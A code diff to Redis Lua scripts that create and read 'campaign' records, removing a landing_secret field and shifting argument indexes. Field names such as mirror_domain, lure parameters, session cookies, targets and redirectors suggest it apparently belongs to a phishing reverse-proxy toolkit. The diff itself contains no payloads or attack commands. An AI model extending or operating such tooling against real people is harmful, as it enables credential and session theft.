@@ -4,7 +4,7 @@
   Create campaign
 --]]
 local function create_campaign(keys, args)
-  if not (#keys == 3 and #args == 12) then
+  if not (#keys == 3 and #args == 11) then
     return redis.error_reply('ERR Wrong function use')
   end
 
@@ -16,17 +16,16 @@ local function create_campaign(keys, args)
     campaign_id = args[1],
     mirror_domain = args[2],
     description = args[3],
-    landing_secret = args[4],
-    landing_auth_path = args[5],
-    landing_auth_param = args[6],
-    landing_lure_param = args[7],
-    session_cookie_name = args[8],
-    session_expire = tonumber(args[9]),
-    new_session_expire = tonumber(args[10]),
-    message_expire = tonumber(args[11]),
+    landing_auth_path = args[4],
+    landing_auth_param = args[5],
+    landing_lure_param = args[6],
+    session_cookie_name = args[7],
+    session_expire = tonumber(args[8]),
+    new_session_expire = tonumber(args[9]),
+    message_expire = tonumber(args[10]),
     session_count = 0,
     message_count = 0,
-    created_at = tonumber(args[12]),
+    created_at = tonumber(args[11]),
     updated_at = nil,
   }
 
@@ -36,10 +35,6 @@ local function create_campaign(keys, args)
 
   if not (#model.mirror_domain > 0) then
     return redis.error_reply('ERR Wrong model.mirror_domain')
-  end
-
-  if not (#model.landing_secret > 0) then
-    return redis.error_reply('ERR Wrong model.landing_secret')
   end
 
   if not (#model.landing_auth_path > 0) then
@@ -130,7 +125,6 @@ local function read_campaign(keys, args)
     'campaign_id',
     'mirror_domain',
     'description',
-    'landing_secret',
     'landing_auth_path',
     'landing_auth_param',
     'landing_lure_param',
@@ -144,7 +138,7 @@ local function read_campaign(keys, args)
     'updated_at'
   )
 
-  if not (#values == 15) then
+  if not (#values == 14) then
     return redis.error_reply('ERR Malform values')
   end
 
@@ -152,22 +146,21 @@ local function read_campaign(keys, args)
     campaign_id = values[1],
     mirror_domain = values[2],
     description = values[3],
-    landing_secret = values[4],
-    landing_auth_path = values[5],
-    landing_auth_param = values[6],
-    landing_lure_param = values[7],
-    session_cookie_name = values[8],
-    session_expire = tonumber(values[9]),
-    new_session_expire = tonumber(values[10]),
-    message_expire = tonumber(values[11]),
+    landing_auth_path = values[4],
+    landing_auth_param = values[5],
+    landing_lure_param = values[6],
+    session_cookie_name = values[7],
+    session_expire = tonumber(values[8]),
+    new_session_expire = tonumber(values[9]),
+    message_expire = tonumber(values[10]),
     proxy_count = redis.call('ZCARD', proxy_index_key),
     target_count = redis.call('ZCARD', target_index_key),
     redirector_count = redis.call('ZCARD', redirector_index_key),
     lure_count = redis.call('ZCARD', lure_index_key),
-    session_count = tonumber(values[12]),
-    message_count = tonumber(values[13]),
-    created_at = tonumber(values[14]),
-    updated_at = tonumber(values[15]),
+    session_count = tonumber(values[11]),
+    message_count = tonumber(values[12]),
+    created_at = tonumber(values[13]),
+    updated_at = tonumber(values[14]),
   }
 
   for field, value in pairs(model) do
